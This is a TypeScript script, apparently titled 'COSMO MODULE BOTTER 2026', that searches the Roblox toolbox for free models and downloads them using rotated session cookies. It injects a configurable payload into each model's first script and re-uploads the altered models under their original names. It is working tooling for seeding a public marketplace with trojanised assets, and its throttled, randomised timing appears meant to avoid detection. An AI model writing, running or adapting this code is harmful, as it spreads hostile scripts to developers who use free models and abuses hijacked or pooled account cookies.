import axios from "axios";
import * as readline from "readline";
import { RobloxFile } from "rbxm-parser";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";
import dotenv from "dotenv";

dotenv.config();

const stats = { modified: 0, scanned: 0, errors: 0, uploaded: 0 };
const uploadLimit = parseInt(process.env.UPLOAD_LIMIT || "20");
const payload = process.env.PAYLOAD || "print('cosmo 2026 infected')";
const cookies = (process.env.COOKIES || process.env.ROBLOX_COOKIE || "").split(",").filter(Boolean);
let currentCookieIndex = 0;

async function sleep(ms: number) { return new Promise(r => setTimeout(r, ms + Math.random() * 1500)); }

async function searchModels(keyword: string, cursor?: string) {
  try {
    const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(keyword)}${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await axios.get(url, { headers: { "User-Agent": "Roblox/WinInet" } });
    return res.data;
  } catch { return null; }
}

async function downloadModel(id: number, cookie: string) {
  try {
    const res = await axios.get(`https://assetdelivery.roblox.com/v1/asset/?id=${id}`, { 
      responseType: "arraybuffer", 
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` } 
    });
    return Buffer.from(res.data);
  } catch { return null; }
}

function infectScript(file: RobloxFile) {
  try {
    const scripts = file.FindDescendantsOfClass("Script").concat(file.FindDescendantsOfClass("LocalScript"));
    if (scripts.length) {
      scripts[0].Source += "\n" + payload;
      stats.modified++;
      return true;
    }
  } catch {}
  return false;
}

async function uploadModel(filePath: string, name: string, cookie: string) {
  try {
    const buf = fs.readFileSync(filePath);
    let assetId = await noblox.uploadModel(buf, {name, description: "Cosmo 2026"}).catch(async () => {
      const form = new FormData();
      form.append("file", new Blob([buf]), "model.rbxm");
      const r = await axios.post("https://data.roblox.com/Data/Upload.ashx?assetid=0&type=Model", form, {headers: {Cookie: `.ROBLOSECURITY=${cookie}`}});
      return parseInt(r.data || "0");
    });
    if (assetId) {
      stats.uploaded++;
      fs.rmSync(filePath);
      console.log(`[UP] ${assetId}`);
    }
  } catch (e) { console.log("[UPLOAD FAIL]"); }
}

async function processModel(m: any, cookie: string) {
  const data = await downloadModel(m.id, cookie);
  if (!data) return;
  const file = RobloxFile.ReadFromBuffer(data);
  if (!file || !infectScript(file)) return;
  const dir = path.join(process.cwd(), "infected");
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);
  const out = path.join(dir, `${m.id}_cosmo.rbxm`);
  fs.writeFileSync(out, file.WriteToBuffer());
  await uploadModel(out, m.name || "Cosmo Model", cookie);
  stats.scanned++;
}

async function main() {
  console.log("COSMO MODULE BOTTER 2026 STARTED");
  let cursor;
  const query = process.env.SEARCH_QUERY || "free model";
  while (stats.uploaded < uploadLimit) {
    const res = await searchModels(query, cursor);
    if (!res?.data?.length) break;
    for (const m of res.data) {
      if (stats.uploaded >= uploadLimit) break;
      const cookie = cookies[currentCookieIndex % cookies.length] || "";
      currentCookieIndex++;
      await processModel(m, cookie);
      await sleep(1500);
    }
    cursor = res.nextPageCursor;
  }
  console.log(`Done: uploaded ${stats.uploaded}`);
}

main();
